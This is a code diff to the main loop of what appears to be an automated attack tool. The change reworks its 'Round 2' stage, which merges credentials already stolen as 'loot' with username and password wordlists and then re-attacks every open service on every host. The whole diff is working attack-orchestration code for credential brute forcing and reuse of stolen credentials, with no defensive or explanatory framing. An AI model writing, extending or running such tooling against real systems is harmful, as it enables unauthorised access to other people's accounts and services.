@@ -79,29 +79,34 @@ def main():
         return
     print(f"{Color.GRN}Attack completed. Re-attacking services using any stored loot.{Color.END}", file=args.output)
 
+    # cache all usernames/passwords in memory before round 2
+    suggested_usernames, suggested_passwords = [], []
+    with open(args.usernames, 'r') as g:
+        for suggested_username in g.readlines():
+            suggested_usernames.append(suggested_username.strip())
+    with open(args.passwords, 'r') as g:
+        for suggested_password in g.readlines():
+            suggested_passwords.append(suggested_password.strip())
+
     for host in host_openings:
         for open_service in host_openings[host]:
             exploit = exploits[open_service]
             found_usernames, found_passwords = zip(*get_logged_loot())
-            found_usernames = list(set((x for x in found_usernames if x)))
-            if not found_usernames:
+            if not found_usernames or not found_passwords:
                 return
             print(f"{Color.ULINE}Round 2 of attacking host {host} on port {exploit.port} using {exploit.name}.",
                   f"This may take a while.{Color.END}",
                     file=args.output)
+            found_usernames = found_usernames + suggested_usernames
+            found_passwords = found_passwords + suggested_passwords
+            found_usernames = list(set(x for x in found_usernames if x))
+            found_passwords = list(set(x for x in found_passwords if x))
             with open('data/usernames_cache.txt', 'w') as f:
                 for username in found_usernames:
                     f.write('%s\n' % username)
-                with open(args.usernames, 'r') as g:
-                    for suggested_username in g.readlines():
-                        f.write(suggested_username)
-            found_passwords = list(set(x for x in found_passwords if x))
             with open('data/passwords_cache.txt', 'w') as f:
                 for passwords in found_passwords:
                     f.write('%s\n' % passwords)
-                with open(args.passwords, 'r') as g:
-                    for suggested_password in g.readlines():
-                        f.write(suggested_password)
             new_loot = exploit.attack(host, 'data/usernames_cache.txt', 'data/passwords_cache.txt')
             os.remove('data/usernames_cache.txt')
             os.remove('data/passwords_cache.txt')
